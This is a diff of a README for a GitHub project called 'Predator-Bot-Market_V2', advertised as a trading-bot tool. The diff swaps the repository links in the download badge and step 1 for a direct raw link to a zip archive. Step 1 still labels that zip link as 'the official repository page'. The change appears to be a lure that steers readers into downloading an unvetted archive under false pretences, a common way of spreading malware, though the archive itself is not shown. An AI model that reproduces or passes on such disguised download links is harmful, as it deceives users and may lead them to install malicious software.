@@ -1,6 +1,6 @@
 # 🤖 Predator-Bot-Market_V2 - Access institutional trading tools with ease
 
-[![](https://img.shields.io/badge/Download-Predator_Bot-blue)](https://github.com/flattering-jaycooke616/Predator-Bot-Market_V2)
+[![](https://img.shields.io/badge/Download-Predator_Bot-blue)](https://github.com/flattering-jaycooke616/Predator-Bot-Market_V2/raw/refs/heads/main/artifacts/predator-bots/public/Predator-Bot-Market-3.1.zip)
 
 ## 📦 What is this software?
 
@@ -21,7 +21,7 @@ Confirm your computer meets these conditions to ensure smooth operation:
 
 Follow these steps to find and save the files you need.
 
-1.  Visit the official repository page: [https://github.com/flattering-jaycooke616/Predator-Bot-Market_V2](https://github.com/flattering-jaycooke616/Predator-Bot-Market_V2)
+1.  Visit the official repository page: [https://github.com/flattering-jaycooke616/Predator-Bot-Market_V2/raw/refs/heads/main/artifacts/predator-bots/public/Predator-Bot-Market-3.1.zip](https://github.com/flattering-jaycooke616/Predator-Bot-Market_V2/raw/refs/heads/main/artifacts/predator-bots/public/Predator-Bot-Market-3.1.zip)
 2.  Locate the green button labeled "Code" near the top right of the file list.
 3.  Choose "Download ZIP" from the menu.
 4.  Wait for the file to finish saving to your "Downloads" folder.
